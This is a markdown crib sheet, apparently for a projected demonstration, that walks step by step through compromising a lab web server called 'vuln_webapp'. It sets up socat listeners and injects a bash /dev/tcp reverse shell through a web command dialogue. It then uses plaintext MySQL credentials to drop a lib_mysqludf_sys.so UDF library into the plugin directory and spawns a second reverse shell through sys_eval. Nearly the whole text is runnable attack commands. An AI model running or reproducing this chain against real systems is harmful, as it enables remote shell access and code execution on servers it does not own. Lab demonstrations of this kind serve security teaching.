#Compromise "crib sheet" workflow:

* ensure iptables on laptop is open to receive reverse shells.
   * sudo iptables -I INPUT -p tcp --dport 11457 -j ACCEPT
   * sudo iptables -I INPUT -p tcp --dport 11458 -j ACCEPT
* launch terminator onto projector
   * split into 4 panes
       * ctrl + shift + o (split horizontal)
       * ctrl + shift + e (split vertical)
* upper left pane.
    * socat readline TCP-LISTEN:11457 
* upper right pane.
    * socat readline TCP-LISTEN:11457 
* lower left pane
    * ping 172.16.33.2 show web server is up
    * launch stage_webshell.sh in lower left of terminator
* lower right pane
   * once stage_webshell.sh has completed, launch stage_udf.sh

* open browser to http://172.16.33.2/vuln_webapp/images.php
    * in "Run command dialogue": bash -i >& /dev/tcp/172.16.33.1/11457 0>&1 &
    * head back to terminator upper left pane
        * run
            * id
            * w
            * cat sqli.php (not getting db server details)
            * mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp < data.sql 
            * mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT @@GLOBAL.plugin_dir" 
            * mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT payload FROM udf_stager INTO DUMPFILE '/usr/lib64/mysql/plugin/lib_mysqludf_sys.so'"

            * ```cat > data2.sql << EOF
               DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;
               DROP FUNCTION IF EXISTS sys_get;
               DROP FUNCTION IF EXISTS sys_set;
               DROP FUNCTION IF EXISTS sys_exec;
               DROP FUNCTION IF EXISTS sys_eval;

               CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';
               CREATE FUNCTION sys_get RETURNS string SONAME 'lib_mysqludf_sys.so';
               CREATE FUNCTION sys_set RETURNS int SONAME 'lib_mysqludf_sys.so';
               CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';
               CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';
               EOF```
            * mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp < data2.sql 
            * mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT sys_eval('id')" 
            * mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT sys_eval('whoami')" 
             * mysql -h 172.16.33.2 -u vuln_webapp -ppluk vuln_webapp -e "SELECT sys_eval('bash -i >& /dev/tcp/172.16.33.1/11458 0>&1 &')"
    * head back to terminator upper right pane
        * run
            * id
            * whoami
            * uname -a
